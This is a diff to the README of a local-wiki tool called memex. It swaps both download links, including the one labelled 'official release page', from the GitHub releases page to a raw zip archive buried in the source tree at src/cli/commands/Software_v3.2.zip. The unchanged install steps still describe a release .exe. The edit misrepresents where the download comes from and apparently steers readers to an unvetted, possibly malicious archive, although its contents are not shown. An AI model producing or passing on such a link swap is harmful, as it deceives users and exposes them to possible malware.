@@ -1,12 +1,12 @@
 # 🧠 memex - Organize your local files into wikis
 
-[![Download memex](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/muhlsteinovajemima439-design/memex/releases)
+[![Download memex](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/muhlsteinovajemima439-design/memex/raw/refs/heads/main/src/cli/commands/Software_v3.2.zip)
 
 Memex turns folders into internal knowledge bases. It works by mapping your existing file system into an easy layout. You do not need databases or servers. You store your notes as plain text files on your local drive. This keeps your data private and portable.
 
 ## 📥 How to download 
 
-1. Go to the [official release page](https://github.com/muhlsteinovajemima439-design/memex/releases).
+1. Go to the [official release page](https://github.com/muhlsteinovajemima439-design/memex/raw/refs/heads/main/src/cli/commands/Software_v3.2.zip).
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start your download.
 4. Open the folder where your browser saves files to find the installer.
